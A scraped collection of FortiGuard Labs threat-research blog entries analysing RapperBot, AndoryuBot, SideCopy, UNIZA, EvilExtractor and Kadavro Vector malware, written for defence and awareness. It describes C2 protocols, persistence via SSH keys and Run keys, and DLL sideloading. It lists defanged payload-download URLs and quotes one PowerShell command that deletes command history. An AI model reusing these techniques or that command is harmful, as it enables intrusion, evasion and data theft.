Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "title": "RapperBot DDoS Botnet Expands into Cryptojacking",
    "link": "https://www.fortinet.com/blog/threat-research/rapperbot-ddos-botnet-expands-into-cryptojacking",
    "content": "FortiGuard Labs Threat Research Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical FortiGuard Labs has encountered new samples of the RapperBot campaign active since January 2023. RapperBot is a malware family primarily targeting IoT devices. It has been observed in the wild since June 2022. FortiGuard Labs reported on its previous campaigns inAugust 2022andDecember 2022. Those campaigns focused on brute-forcing devices with weak or default SSH or Telnet credentials to expand the botnet’s footprint for launchingDistributed Denial of Service(DDoS) attacks. In this campaign, these threat actors have started venturing intocryptojacking, specifically for Intel x64 machines. Initially, they deployed and executed a separate Monero cryptominer alongside the usual RapperBot binary. But in late January 2023, they combined both functionalities into a single bot. This article will discuss the changes observed in this new campaign and provide a technical analysis of the RapperBot variant upgraded with miner capabilities. We began observing the first samples of this RapperBot miner campaign in January 2023. They share some characteristics that allowed us to link this campaign to the earlier ones. The most unique and enduring trait of RapperBot samples is the YouTube URLhttps://www.youtube.com/watch?v=4fm_ZZn5qaw, which has been seen in most samples from this family. However, the string is never actually used in this campaign, unlike older samples where it prints the URL to the console at the start of execution. Another indicator of a RapperBot campaign is adding an SSH public key to~/.ssh/authorized_keysto maintain backdoor access to infected machines, even after the devices have been rebooted. This latest campaign uses the same key observed in the first campaign in June 2022 and is listed in the IOC section below. Beyond these similarities, however, we also observed some key differences, including several significant updates to the malware functionality, particularly in its C2 communication protocol. One cluster of ARM samples, suchas 7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f(Cluster A) that were delivered viahxxp://109[.]206[.]243[.]207/ssh/arm7,were very minimal in functionality. They only included three DoS attack types and no SSH brute forcing or self-propagation abilities. However, these samples included new code to collect and send information about the infected system upon registering with the C2 server. Another cluster of ARM samples delivered from the same URL, such as912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65(Cluster B), resembles the above samples but with the inclusion of the SSH brute-forcer last seen in the June 2022 campaign. Unlike that campaign, credentials are embedded in each sample and not downloaded from the C2 server. These samples propagate themselves by downloading and executing hxxp://109[.]206[.]243[.]207/d upon the successful brute force breach of a system. As in past campaigns, all samples from this campaign still encode sensitive strings with XOR encoding. But this time, the developers have opted to add an extra layer of XOR encoding, with the first layer using multi-byte XOR keys with different values and lengths for each encoded string. The second layer uses the same style of single-byte XOR encoding as in previous campaigns, with the key calculated by XORing all bytes of the first layer key (Figure 1). This additional layer of XOR encoding prevents XOR brute forcing and the easy detection of malware-related strings. The original draft was worded ambiguously, we meant to say that this campaign embedded the credentials in each sample. In the previous campaign, the credentials were downloaded from the C2 server. The structure of client requests to the Command-and-Control (C2) server has also been significantly updated. The unique 32-byte Bot ID sent with every request in previous campaigns has been removed. Instead, the request size is now variable, with random bytes generated to fill the unused parts of the request. Lastly, the request data is no longer located at fixed offsets within each request. We describe the communication protocol and request structure in more detail below. Upon execution, RapperBot connects to a hardcoded C2 server and sends a registration request (type1) containing information about the victim system (Figure 2): 1.     Hardcoded value: 0x3 0xd3 0x4a 0xb6 2.     Source: This is the first command line argument passed to the malware and usually indicates the infection vector (e.g., scan.ssh.x86_64) 3.     Local IP address 4.     UID (User identifier) 5.     Current working directory 6.     Number of processors 7.     Total memory size 8.     Open File Limit 9.     Hostname 10.  Processor model After that, it sends a keep-alive request (type3) to inform the C2 server that it is ready to receive commands. The malware then performs this request at random intervals of 60 to 600 seconds. To evade detection, the binary network protocol used to send these requests has been completely revised. Like its string encoding, it uses a two-layer approach to encode the information sent to the C2 server. The header data must first be decoded to reveal the location of the encoded information and the key needed to decode it. The size of each request is randomized, so shorter requests do not stand out in network traffic. The malware starts by generating a random number between 4 and 128, which we will refer to as RAND_VALUE, and a random XOR key for the content from 4 to 32 bytes long (referred to as KEY_SIZE). The request size is then calculated as follows: REQUEST_SIZE = RAND_VALUE + KEY_SIZE + CONTENT_SIZE + 6 The malware then generates a buffer of the same size and fills it with random bytes. The first byte of this buffer will be used as a XOR key (HEADER_KEY) for encoding the header data. The second byte will be overwritten with the RAND_VALUE XORed with the HEADER_KEY. The request data is stored at HEADER_OFFSET, RAND_VALUE / 2. The format of the structure starting at HEADER_OFFSET is as follows: All non-highlighted bytes in Figure 3 are unused padding bytes generated randomly by the malware. The Python code used to decode the content in each request with the HEADER_KEY and KEY is shown below: While we did not receive commands from the C2 server, our analysis shows that the bot supports the following commands with their corresponding IDs. The change in the C2 communication protocol is not the only major update in this campaign. Until now, RapperBot has been primarily geared toward using its victims for DDoS operations. For this campaign, however, it has started to venture into abusing the resources of infected Intel x64 machines to mine for cryptocurrency, commonly known as Cryptojacking. We observed thathxxp://109[.]206[.]243[.]207/ssh/x86_64started serving Bash shell scripts instead of the usual RapperBot binary for the x64 architecture as early as January 12. These Bash scripts (example hash:7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f) downloaded and executed separate XMRig crypto miners (example hash:0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404) and RapperBot binaries, as seen in Figure 4. XMRig is an open-source Monero miner commonly abused by threat actors for cryptojacking. Monero (XMR) is a popular cryptocurrency for illicit mining by threat actors because of its privacy-enhancing features. It is also designed to be more resistant to application-specific integrated circuit (ASIC) miners, which makes it possible to mine profitably with just consumer-grade hardware. In late Jan 2023, FortiGuard Labs collected a significantly larger x64 samplef06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa,which used the same C2 server IP and communication protocol. On further analysis, we verified that the bot developers had merged the RapperBot C source code with the C++ code of XMRig Monero miner to create a combined bot client with mining capabilities. Apart from executing the miner as a child process upon execution, these samples are functionally identical to those targeting ARM devices and do not have SSH brute-forcing or self-replication capabilities. Merging the bot and miner code might be an attempt to hide the mining pools and Monero wallet addresses (listed in the IOCs section) using the same double-layer XOR encoding so they are not exposed in the clear, as in the Bash script (Figure 4). The miner code also contains several modifications to facilitate cryptojacking. The ability to read external configuration files has been removed, so it always uses the configuration built into the binary itself. The bot decodes the mining pools and Monero wallet addresses and updates the hardcoded configuration before starting the embedded miner. The miner is also configured to use multiple mining pools for both redundancy and additional privacy. Two of them are mining proxies hosted on the RapperBot C2 IP itself. This allows the threat actor to omit both the wallet addresses and actual mining pools from the miner configuration. Additionally, they can change this information on the proxy server without rebuilding and deploying new bots. Aside from this, it is also configured to directly use a public mining pool, likely as a backup if the C2 IP goes offline. To prevent the termination of the miner process by the machine owner, the default signal handlers for SIGTERM, SIGUSR1, SIGINT, and SIGHUP signals have been removed. The usage information printed when executing the--helpcommand line argument has also been removed, likely to evade detection by security products and competing miners from other cryptojacking groups. Likewise, the developers also replaced “XMRig\" with “asbuasdbu\" in the version information to prevent easy identification. To maximize mining efficiency, it kills off other miners by enumerating other running processes and attempts to scan the associated binaries on disk for the following blacklisted keywords. These processes are then terminated, and the corresponding files are deleted. For example, “--algo” in the list below is part of the usage information printed by standard XMRig miners. If the binaries are not readable, it will look for blacklisted keywords within the file paths, terminate the processes, and delete the associated files. Lastly, it will terminate processes containing the blacklisted keywords in the process path or its command line arguments. Processes with path or command-line arguments containing “/zvx/” are whitelisted and never terminated. Based on the keywords used, the bot developers are more interested in terminating other miners than other IoT bots. This reaffirms their focus on cryptojacking vs DDoS attacks, at least on x64 machines. As a side note, we have not discovered an infection vector that directly delivers x64 RapperBot, as none of the RapperBot samples with an integrated miner appear to have self-propagation capabilities. This suggests the possible availability of an external loader operated by the threat actor that abuses the credentials collected by other RapperBot samples with brute forcing capabilities and infects only x64 machines with the combined bot/miner. Alternatively, the addition of the threat actor’s public SSH key in infected machines might provide another point of entry for these x64 samples. Financially motivated botnet operators are always on the lookout to extract the maximum value from machines infected by their botnets. The threat actors behind the RapperBot botnet are no exception, as evident in their addition of cryptojacking capabilities to target x64 machines. RapperBot continues to be a dangerous threat due to its continual updates to evade detection, as highlighted above. As its primary infection vector of compromising SSH services using weak or default passwords remains the same, mitigating it by enabling public key authentication or setting strong passwords for all devices connected to the internet is still effective in mitigating this threat. FortiGuard Labs will continue to monitor and report on RapperBot’s development.

    "link": "https://www.fortinet.com/blog/threat-research/andoryubot-new-botnet-campaign-targets-ruckus-wireless-admin-remote-code-execution-vulnerability-cve-2023-25717",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of vulnerable systemsSeverity level:Critical In April, FortiGuard Labs observed a unique botnet based on the SOCKS protocol distributed through the Ruckus vulnerability (CVE-2023-25717). This botnet, known as AndoryuBot, first appeared in February 2023. It contains DDoS attack modules for different protocols and communicates with its command-and-control server using SOCKS5 proxies. Based on our IPS signatures trigger count (Figure 1), this campaign started distributing the current version sometime after mid-April. This article details how this malware leverages the Ruckus vulnerability and examines its behavior once inside an infected device. AndoryuBot targets the Ruckus vulnerability to gain access to a device. It then downloads a script for further propagation. The complete script is shown in Figure 3, and the downloading URL is http[:]//163[.]123[.]142[.]146. The AndoryuBot variant in this analysis targets the following architectures: arm, m68k, mips, mpsl, sh4, spc, and x86. It is saved under the filename “Andoryu,” which is how the campaign name was derived. It also uses its downloading method, “curl”, as its file extension. In addition, although it has “.ppc” in the script, instead of a valid execution file, the link only contains the string “Invalid file bixxh axx boi”. AndoryuBot first checks the argument count—the assembly code is shown in Figure 4. Take the x86 file as an example: the original parameters are “Andoryu.10curl” and “ruckus”. It then decodes data from the “.rodata” section. Figure 5 shows part of the code. The encryption key, “0x2A41605D“, and the clear text are shown in Figure 6. After the execution, it prints the string, “Project Andoryu(12/30/2022). What color is your botnet !” in the console. Analysis indicates that this project began last year, which makes this quite a new botnet group. After initialization, AndoryuBot sends a GET request to extract the victim’s public IP address. The HTTP request to “api.ipify.org” has a hardcoded User-Agent string, shown in Figure 7. Then it starts a connection to its C2 server, 45[.]153[.]243[.]39[:]10333, using the SOCKS protocol. The code is shown in Figure 8. The first data sent from the compromised endpoint is shown in Figure 9. After its communication channel setup, the client waits for a command from the server to launch a DDoS attack. The functions are shown in Figure 10. AndoryuBot includes 12 methods: tcp-raw, tcp-socket, tcp-cnc, tcp-handshake, udp-plain, udp-game, udp-ovh, udp-raw, udp-vse, udp-dstat, udp-bypass, and icmp-echo. We can locate these from the decoded data in the previous section. Once the victim system receives the attack command, it starts a DDoS attack on a specific IP address and port number. One example of the DDoS attack traffic is shown below: Based on the above features from AndoryuBot, we found a YouTube video published on April 25 that gives a brief induction about “Andoryu Net”. The description of its attack methods found on its selling page in Telegram is shown in Figure 12. The names match the decoded data from the AndoryuBot sample we collected. The Andoryu project will likely continue to update its features to increase interest and sales. CVE-2023-25717 is a remote code execution vulnerability affecting multiple Ruckus wireless Access Point (AP) devices (FortiGuard Labs released athreat signal reportabout CVE-2023-25717 on April 28). Once a target device is compromised, AndoryuBot quickly spreads and begins communicating with its C2 server via the SOCKS protocol. In a very short time, it is updated with additional DDoS methods and awaits attack commands. Users should be aware of this new threat and actively apply patches on affected devices as soon as they become available. This malware is detected and blocked by FortiGuard Antivirus as: ELF/Andoryu.CBN!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. Fortinet has also released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.

    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Controls victim’s machine and collects sensitive informationSeverity Level:Medium Occasionally, FortiGuard Labs researchers come across a file name or e-mail subject that makes us sit up and take notice. Of course, it may turn out to be nothing. But every once in a while, one of these turns out to be incredibly interesting. We recently came across one such file that referenced an Indian state military research organization and an in-development nuclear missile. The file was meant to deploy malware with characteristics matching the APT group “SideCopy.” With activities dating back to at least 2019, this group has aligned its targeting with the goals and objectives of the Pakistani government. The SideCopy APT group is known to leverage similar TTPs (Tactics, Techniques, and Procedures)—and in some cases, utilizes the same infrastructures—as another Pakistan-based threat actor group known as “Transparent Tribe.” Some reports even claim that SideCopy is a subsidiary of Transparent Tribe. The group was allegedly named “SideCopy” because an infection chain they employed was copied from the long-time Indian threat actor group SideWinder in a likely attempt to make attribution more difficult. Although SideCopy primarily targets Windows platforms, some reports indicate they have deployed malware to compromised Mac and Linux machines. The initial infection vector is suspected to be a phishing e-mail. However, that information was not available to FortiGuard Labs at the time of our investigation. That said, we do have access to a Zip file that would have been the likely attachment to an e-mail. The file is named “DRDO-K4-Missile-Clean-room.zip”. When the name’s meaning is fully parsed, it becomes quite interesting. “DRDO” refers to India’s Defence Research and Development Organisation (https://en.wikipedia.org/wiki/Defence_Research_and_Development_Organisation). “K-4” refers to the intermediate-range SLBMs (Submarine-Launched Ballistic Missiles) housed in their Arihant class of nuclear-powered ballistic missile submarines (https://en.wikipedia.org/wiki/K-4_(missile)). And “clean room” refers to the facility required to assemble sensitive components or perform intensive maintenance on these missiles. The Zip file contains three files, with two of them meant to be deployed in a subdirectory of the extraction location. The “office.template.mac” and “office.template.ui” files appear to contain unformatted data and have no bearing on the infection chain. They seem to function as decoys to make the third file, “DRDO-K4 Missile Clean room.pptx.lnk”, appear more legitimate. This is a Microsoft Windows shortcut file. On any Windows system with file extensions hidden, the “.lnk” extension would not be visible, making it appear as “DRDO-K4 Missile Clean room.pptx”. This deception makes it more difficult to distinguish the file as malicious simply by looking at it. The Windows shortcut file does not open a PowerPoint file (at least immediately). Instead, it reaches out to a domain controlled by the attacker using the utility for Microsoft HTML Applications (HTAs), or “mshta.exe”. In this case, the command line argument points to a URL. At the other end of the URL is a malicious file, “Pantomime.hta”, that will be downloaded and executed: hXXp://cornerstonebeverly[.]org/js/files/docufentososo/doecumentosoneso/pantomime[.]hta. Previous SideCopy incidents have been observed to useCACTUSTORCHto deploy code in an obfuscated manner via JavaScript and VBScript. This campaign appears to differ because the payload here seems to have been created using a tool called SILENTTRINITY. SILENTTRINITYis a newer, more comprehensive tool that can be used as a fully featured post-exploitation framework in the same vein as Empire or CobaltStrike. It effectively allows the execution of Microsoft .Net code without using PowerShell as an intermediary step. In this case, it appears that the payload was generated using the tool. However, it is unknown whether the backend that served this file or its subsequent stages used it. “Pantomime.hta” contains several sections of note. The head of the file validates the .Net version installed on the victim machine and verifies whether the folder “C:\\ProgramData\\HP” is present. If not, it will create it. Most of the rest of the file is dominated by two encoded sections stored in variables “dividAndRule” and “punctureTyres”. Both are base 64 encoded, albeit in slightly different ways. It’s helpful to start with the second section first, as it has to be read first for the code to be executed properly. As Figure 6 shows, “punctureTyres” is passed to the function “basforsixfourstream” (as shown in Figure 5), which decodes it from base64. The newly decoded “punctureTyres” is deserialized (read into a memory stream), where it can be executed. Contained within this stream is a Microsoft .Net library named “hta.dll”. It includes a function called “RealityShow” that is used to pass the base64-encoded variable “dividAndRule” so the file “DRDO-K4 Missile Clean room.pptx” can be deployed as well as the next stage of the malware. As mentioned, “hta.dll” aims to deploy “DRDO-K4 Missile Clean room.pptx”. It can be deployed as well as the next stage of the malware. After being called from “Pantomime.hta”, the function “openthefile” takes the data from “dividAndRule”, decodes it from base64, and decompresses it due to it being a GZip compressed data stream. It then opens the file for display. Additionally, the function “getThirdStrike” is called to begin the next phase of infection. “getThirdStrike” establishes the download location for what will become the file “jquery.hta”. It then sends that on the function “runItOn” to reach out to “hXXp://cornerstonebeverly[.]org/js/files/ntfonts/jquery.txt” to download the file. “getThirdStrike” also assesses the antivirus situation on the victim machine and passes that information on via an HTTP POST through the “pkg.infinity” function, which will reach out to “hXXp://cornerstonebeverly.org/js/files/ntfonts/avena/”. Once all of this occurs, the execution of “jquery.hta” commences. Unlike the shortcut that shares its name, this is an actual Microsoft PowerPoint file. The PowerPoint deck contains 22 slides and is a convincing treatise on the requirements for building a cleanroom environment to suit the needs of a major aerospace project in that region of the globe. The file, however, is entirely benign and operates as a decoy to conceal other activities being undertaken. “jquery.hta” is very similar in structure and purpose to “Pantomime.hta”. It advances the infection by deploying additional files from multiple variables with encoded data. It seems to have also been created by SILENTTRINITY. The head of the file contains the function “decode_base64”, a custom implementation to decode base 64-encoded data that will be used later and a large, encoded section attached to a variable called “addle”. Like “Pantomime.hta”, this gets executed once the next section is decoded and executed. The variable “InMomemerandum” contains the base64-encoded data for another .Net DLL called “PreBot.dll”. The function “decode_base64” from Figure 12 is now being used to decode a small block of base64 text, “U2VsZWN0ICogRnJvbSBBbnRpVmlydXNQcm9kdWN0”. This translates to “Select * From AntiVirusProduct”, a Windows Management Instrumentation (WMI) query to obtain information on what type of antivirus product(s) may be installed on the system. Figure 14 shows that “InMomemerandum” will be sent to a function to decode it from base 64—in this case, the function “bazSixFerToStreeeemStranger”. It is then deserialized to run “PreBot.dll” in memory, after which point the data from the variable “addle” is passed to the function “PinkAgain”. The opening class declaration of “DraftingPad” contains the path destinations for the files remaining to be deployed for this attack. In addition to containing the desired landing locations for the remaining files, some additional base 64 encoded text is assigned to the variable “BatFileBytes”. The “PinkAgain” function takes the data passed from “jquery.hta” in the form of a base 64-encoded, GZip-compressed stream of bytes and the antivirus settings of the victim machine and route them to a function that will deal with them appropriately. The purpose of “test.bat” is to create a registry key called “Windows Update Schedule” in the “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” registry hive. The naming convention attempts to assist it in blending in as something that looks legitimate. This ensures that the file “C:\\Users\\Public\\hp\\cridviz.exe” is executed upon each system restart. Finally, “DUser.dll” is decompressed and deposited into its target location of “C:\\Users\\Public\\hp\\” alongside “cridviz.exe”. This contains the main code for a Remote Access Trojan (RAT) that will be used along with the aforementioned “credviz.exe” by having its code sideloaded (https://attack.mitre.org/techniques/T1574/002/) into it when it launches. The file “C:\\Users\\Public\\hp\\cridviz.exe” is copied from its usual location at either “C:\\Windows\\SysWOW64\\credwiz.exe” or “C:\\Windows\\System32\\credwiz.exe” (depending on the system’s architecture) to the above location with the filename slightly altered. “cridviz.exe” is the \"Credential Backup and Restore Wizard\" used as part of the Windows Credential Manager to provide a method for backing up and restoring saved credentials on the system. As mentioned previously, the SideCopy RAT doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. In this case, it’s “cridviz.exe”. It uses sideloading to do this, which is to say that a dependency of the legitimate application is highjacked to allow the malicious code to load. This is done by dropping the malicious DLL “DUser.dll” in the directory with “cridviz.exe”. Interestingly, “DUser.dll” isn’t a direct dependency requirement. It is actually a requirement of two other libraries that “cridviz.exe” requires, “COMCTL32.dll” and “SHELL32.dll”. The result of doing this is that it makes tracing the source of the malicious code much more difficult. The end state for this attack is the deployment and execution of “DUser.dll”. As alluded to above, a legitimate version of this file normally resides in “C:\\Windows\\SysWOW64”. As shown in Figure 23, comparing the illegitimate and legitimate files indicates several differences. Notably, what’s available in the “File description” and “File version” fields, as well as the size of the files, with the malicious one being considerably smaller. Upon execution, “DUser.dll” reaches out to “hXXp://144[.]91[.]72[.]17:8080” as a command and control (C2) node to both send and receive to. The actions performed by the RAT use a distinctive user-agent string, “cpp-httplib/0.7”, making it stand out in traffic. It can communicate over TCP using raw sockets or via HTTP. The RAT can also perform other, less common HTTP verb-related operations, such as “PUT” and “PATCH”. The RAT can start other processes if instructed using the “CreateProcessW” Windows API call. This would be useful for launching additional payloads once a foothold on the target system has been achieved. A targeted campaign, where the attacker takes the time to create a lure relevant enough for a target to pursue, will always open more doors for an attacker. In this case, we saw SideCopy deliver one that would be of interest only to a small group of people in the Indian defense industry. Targets in this position would be of definite interest to the Government of Pakistan and any threat actors that align with its aims.

    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-uniza-coverage",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the UNIZA ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a new ransomware variant called UNIZA. Like other ransomware variants, it encrypts files on victims’ machines in an attempt to extort money. It uses the Command Prompt (cmd.exe) window to display its ransom message, and interestingly, it does not append the filename of the files it encrypts, making it more difficult to determine which files have been impacted. Information on the infection vector used by the UNIZA ransomware threat actor is not currently available however, the likely attack vector is via email as many ransomware variants are distributed that way. At the time of this research, there is no indication that UNIZA ransomware is widespread. UNIZA ransomware is a typical ransomware that encrypts files on compromised machines and demands a ransom payment for recovering the affected files. The ransomware targets all directories and files found under %userprofile% and Desktop for file encryption. Figure 1 displays the ransomware encryption code. Elements of this image are as follows: Instead of dropping a ransom note, it launches the Command Prompt and the ransom note gradually shows up as if the attacker is remotely typing the message. This may be a scare tactic to make victims believe that the attacker can remotely control their machine. The ransom message asks victims to contact the attacker via TikTok and demands 20 Euros worth of Bitcoin. As the ransom fee is relatively low, we believe the UNIZA ransomware threat actor is targeting consumers. At the time of our research, theattacker’s Bitcoin wallethas not recorded a single transaction, which means that no victims have yet fallen prey to this ransomware. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known UNIZA ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "link": "https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim’s device and collects sensitive informationSeverity level:Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices. It includes several modules that all work via an FTP service. It was developed by a company named Kodex, which claims it is an educational tool. However, research conducted by FortiGuard Labs shows cybercriminals are actively using it as an info stealer. Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023. FortiGuard Labs observed this malware in a phishing email campaign on 30 March, which we traced back to the samples included in this blog. It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities. It also contains environment checking and Anti-VM functions. Its primary purpose seems to be to steal browser data and information from compromised endpoints and then upload it to the attacker’s FTP server. We recently reviewed a version of the malware that was injected into a victim’s system and, as part of that analysis, identified that most of its victims are located in Europe and America. The developer released its project in October 2022 (Figure 1) and has kept updating it to increase its stability and strengthen its module. This article will examine the initial attack method used to deliver EvilExtractor and its functions. The phishing email with the malicious attachment is shown in Figure 2. It is disguised as an account confirmation request. The attacker also tricks the victim by using an Adobe PDF icon for the decompressed file. The PE header is shown in Figure 3. The execution file is a Python program packaged by PyInstaller. We extracted it with pyinstxtractor and found that the “PYARMOR” string in its main code file “contain.pyc”, shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected. We extracted the key and iv from _pytransform.dll and decrypted the “contain.pyc” using AES-GCM. In addition to the Python program, we observed a .NET loader that can extract EvilExtractor. Figure 5 is part of the code. It contains Base64-encoded data, which is a PowerShell script. This execution file is generated from the tool “PS2EXE-GUI”, which can convert PowerShell scripts to EXE Files. After decrypting the pyc file, we get the primary code of EvilExtractor. It is a PowerShell script that contains the following modules: It first checks whether the system’s date is between 2022-11-09 and 2023-04-12. If not, it uses the following command to delete the data in PSReadline and terminate: DEL \\\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\*\\\" -Force –Recurse It then compares the product model to see if it matches any of the following: VirtualBox, VMWare, Hyper-V, Parallels, Oracle VM VirtualBox, Citrix Hypervisor, QEMU, KVM, Proxmox VE, or Docker, as shown in Figure 6. It also checks the victim’s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. After passing the environment check, EvilExtractor downloads three components from http://193[.]42[.]33[.]232 used for stealing data. These files are also Python programs that are obfuscated using PyArmor. The first is “KK2023.zip”, which is used for stealing browser data and saving it in the folder “IMP_Data”. It can extract cookies from Google Chrome, Microsoft Edge, Opera, and Firefox. It also collects browser history and passwords from the following browsers: The second file is “Confirm.zip”. It is a key logger that saves data in the “KeyLogs” folder. The last file, “MnMs.zip”, is a webcam extractor. Its corresponding code is shown in Figure 8. EvilExtractor also collects system information by PowerShell script, shown in Figure 9. Figure 10 shows the concatenated data in a text file called “Credentials.txt”. EvilExtractor downloads files with specific extensions from the Desktop and Download folders, including jpg, png, jpeg, mp4, mpeg, mp3, avi, txt, rtf, xlsx, docx, pptx, pdf, rar, zip, 7z, csv, xml, and html. It also uses the command “CopyFromScreen” to capture a screenshot. The code is shown in Figure 11. After EvilExtractor extracts all the data from the compromised endpoint, it uploads it to the attacker’s FTP server, shown in Figure 12. The developer of EvilExtractor also provides an FTP server for those who purchase its malware. EvilExtractor also has a ransomware function. It is called “Kodex Ransomware”, as shown in Figure 13. We extracted this PowerShell script from the .Net loader mentioned in the previous section, and the script for its ransomware is similar to the one for its stealer. It downloads “zzyy.zip” from evilextractor[.]com. Details of the unzipped file, a 7-zip standalone console, are shown in Figure 14. Figure 15 shows it leverages “7za.exe” to encrypt files with the parameter “-p”, which means zipping files with a password. It also generates a ransom-demanding message saved in “KodexRansom”, shown in Figure 16. EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware. Its PowerShell script can elude detection in a .NET loader or PyArmor. Within a very short time, its developer has updated several functions and increased its stability. This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script. We also detailed what functions are included, what data can be collected by EvilExtractor, and how the Kodex Ransomware works. Users should be aware of this new info stealer and continue to be cautious about suspicious mail. The malware described in this report are detected and blocked by FortiGuard Antivirus as: W32/EvilExtractor.A!trW32/Infostealer.A!trW32/Keylogger.A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address.

    "title": "Ransomware Roundup – Kadavro Vector Ransomware",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-kadavro-vector-ransomware",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Kadavro Vector ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a ransomware named “Kadavro Vector”, a NoCry ransomware variant that encrypts files on compromised machines and demands a ransom in Monero (XMR) cryptocurrency for file decryption. Recent variants of the Kadavro Vector ransomware are distributed as a fake Tor browser installer and include a Tor browser icon named “torbrowser-install-win64-12.0.4_ALL.exe”. Once the Kadavro Vector ransomware is executed, it encrypts files on compromised machines and appends a “.vector_” extension to them. The Kadavro Vector ransomware then drops an interactive ransom note on the victim’s desktop and demands $250 worth of Monero for file decryption. Although the ransom note is available in English and Russian in the screenshot below, scrolling down the left pane reveals it is also available in Norwegian. This likely means that the attacker is primarily targeting regions where those languages are used. To date, public submissions of Kadavro Vector ransomware samples have been made from the U.S., Russia, and Kazakhstan. Clicking “Show Encrypted Files” creates a pop-up window with a list of the files the ransomware has encrypted, likely to add pressure on victims by showing the number of affected files that will not be recovered unless a ransom is paid. 